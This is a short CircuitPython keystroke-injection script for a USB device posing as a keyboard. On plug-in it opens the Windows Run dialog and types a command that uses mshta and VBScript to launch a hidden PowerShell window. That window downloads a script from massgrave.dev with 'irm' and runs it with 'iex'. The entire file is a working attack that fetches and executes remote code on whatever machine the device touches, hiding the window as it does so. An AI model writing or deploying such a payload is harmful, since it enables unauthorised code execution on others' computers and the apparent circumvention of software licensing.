import usb_hid
import time
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

kbd.press(Keycode.WINDOWS, Keycode.R)
kbd.release(Keycode.WINDOWS, Keycode.R)

time.sleep(0.3)

layout.write('cmd /C mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell.exe /C irm https://massgrave.dev/get | iex"", 0:close")')

kbd.press(Keycode.ENTER)
kbd.release(Keycode.ENTER)